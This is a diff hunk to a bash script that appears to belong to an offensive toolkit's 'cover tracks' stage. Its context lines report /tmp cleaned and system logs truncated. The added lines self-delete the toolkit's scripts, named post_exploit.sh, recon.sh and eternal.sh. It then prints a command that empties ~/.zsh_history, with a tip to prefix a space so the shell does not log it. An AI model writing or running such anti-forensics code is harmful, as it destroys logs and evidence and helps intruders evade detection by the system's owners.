@@ -145,6 +145,17 @@ echo -e "  ${YELLOW}/tmp          :${RESET} Cleaned"
 echo -e "  ${YELLOW}System logs   :${RESET} Truncated"
 echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
 echo ""
+# --- Self delete ---
+echo -e "${MAGENTA}[>] Self-Deleting Scripts ...${RESET}"
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+for SCRIPT in post_exploit.sh cover_tracks.sh eternal.sh setup.sh recon.sh; do
+    if [ -f "$SCRIPT_DIR/$SCRIPT" ]; then
+        rm -f "$SCRIPT_DIR/$SCRIPT" 2>/dev/null
+        echo -e "  ${GREEN}[+] Deleted : $SCRIPT_DIR/$SCRIPT${RESET}"
+    fi
+done
+echo ""
+
 echo -e "${BOLD}${RED}  FINAL COMMAND to exit cleanly:${RESET}"
 echo -e "  ${CYAN}  cat /dev/null > ~/.zsh_history; exit${RESET}"
 echo -e "  ${YELLOW}  (space before cat)${RESET}"
